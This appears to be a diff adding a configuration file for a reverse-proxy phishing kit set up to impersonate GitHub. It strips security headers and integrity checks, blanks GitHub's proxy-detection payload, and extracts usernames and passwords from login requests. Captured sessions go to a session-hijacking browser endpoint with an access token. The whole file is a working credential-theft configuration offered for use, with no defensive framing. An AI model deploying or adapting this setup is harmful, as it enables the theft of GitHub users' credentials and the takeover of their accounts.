@@ -1,0 +1,173 @@
+{
+  "proxy": {
+    "phishing": "phishing.anti",
+    "destination": "github.com",
+    "skipContentType": [
+      "font/*",
+      "image/*"
+    ],
+    "transform": {
+      "request": {
+        "header": [
+          "Cookie",
+          "Referer",
+          "Origin",
+          "X-Forwarded-For"
+        ]
+      },
+      "response": {
+        "header": [
+          "Location",
+          "WWW-Authenticate",
+          "Origin",
+          "Set-Cookie",
+          "Access-Control-Allow-Origin"
+        ],
+        "body": {
+          "universal": [
+            [
+              "integrity=\"",
+              "no-integrity=\""
+            ]
+          ],
+          "custom": [
+            [
+              "js-proxy-site-detection-payload",
+              ""
+            ],
+            [
+              "expected-hostname",
+              ""
+            ],
+            [
+              "html-safe-nonce",
+              ""
+            ]
+          ]
+        }
+      }
+    },
+    "remove": {
+      "request": {
+        "header": [
+          "X-Forwarded-For"
+        ]
+      },
+      "response": {
+        "header": [
+          "Content-Security-Policy",
+          "Content-Security-Policy-Report-Only",
+          "Strict-Transport-Security",
+          "X-XSS-Protection",
+          "X-Content-Type-Options",
+          "X-Frame-Options",
+          "Referrer-Policy",
+          "X-Forwarded-For"
+        ]
+      }
+    },
+    "drop": [
+      {
+        "url": "/logout",
+        "redirectTo": "https://google.com"
+      }
+    ],
+    "log": {
+      "enabled": true,
+      "filePath": "muraena_logs.txt",
+      "bufferedLogDelay": 2
+    }
+  },
+  "tls": {
+    "enabled": true,
+    "expand": false,
+    "certificate": "./config/phishing-cert.pem",
+    "key": "./config/phishing-key.pem",
+    "root": "./config/phishing-rootCA.pem"
+  },
+  "crawler": {
+    "enabled": false,
+    "depth": 3,
+    "upto": 20,
+    "externalOriginPrefix": "www-",
+    "externalOrigins": [
+      "*.githubassets.com",
+      "*.githubusercontent.com",
+      "github-cloud.s3.amazonaws.com",
+      "www.w3.org",
+      "*.githubapp.com",
+      "octocaptcha.com",
+      "stats.g.doubleclick.net",
+      "www.google.com",
+      "www.google-analytics.com",
+      "www.youtube.com",
+      "raw.githubusercontent.com",
+      "fonts.googleapis.com",
+      "github.community",
+      "youtu.be",
+      "opensource.guide",
+      "mindprod.com",
+      "atom.io",
+      "electron.atom.io",
+      "githubstatus.com",
+      "github.blog",
+      "twitter.com",
+      "www.facebook.com",
+      "www.linkedin.com",
+      "globalgamejam.org",
+      "git-merge.com",
+      "www.ibm.com",
+      "icgj19.gameconf.org",
+      "githubsatellite.com",
+      "probot.github.io",
+      "githubcampus.expert",
+      "opensourcefriday.com",
+      "githubengineering.com",
+      "jekyllrb.com"
+    ]
+  },
+  "necrobrowser": {
+    "enabled": true,
+    "endpoint": "http://10.0.60.34:8080",
+    "token": "ada9f7b8-6e6c-4884-b2a3-ea757c1eb617",
+    "profile": "github",
+    "keywords": null
+  },
+  "staticServer": {
+    "enabled": false,
+    "port": 8080,
+    "localPath": "./static/",
+    "urlPath": "/evilpath/"
+  },
+  "tracking": {
+    "enabled": true,
+    "identifier": "_gat",
+    "regex": "[a-zA-Z0-9]{5}",
+    "urls": {
+      "credentials": [
+        "/session"
+      ],
+      "authSession": [
+        "/settings/profile"
+      ]
+    },
+    "params": [
+      "login",
+      "password"
+    ],
+    "patterns": [
+      {
+        "label": "Username",
+        "matching": "login",
+        "start": "login=",
+        "end": "&password="
+      },
+      {
+        "label": "Password",
+        "matching": "password",
+        "start": "password=",
+        "end": "&webauthn"
+      }
+    ]
+  }
+}
